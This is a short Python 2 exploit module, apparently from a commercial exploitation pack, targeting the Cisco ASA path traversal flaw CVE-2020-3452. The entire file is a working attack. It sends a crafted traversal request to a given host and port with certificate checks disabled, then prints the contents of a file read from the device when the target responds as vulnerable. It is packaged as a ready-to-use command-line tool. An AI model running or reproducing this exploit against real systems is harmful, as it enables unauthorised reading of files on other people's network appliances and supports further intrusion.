#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_cisco_6'
_vendor_ = 'cisco'
_model_  = ['ASA']
_vuln_   = 'Path Traversal Vulnerability'
_cve_    = 'CVE-2020-3452'
_ref_    = 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86'
_port_   = 443

def pwnrouter(host,port=_port_):
  try:
    url = "https://%s:%s/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%%2bCSCOE%%2b/portal_inc.lua" % (host,port)
    response = requests.get(url, verify=False)
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if "/+CSCOE+/include/" in response.text:
    print '[+] %s vulnerable' % host
    print response.text  


if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
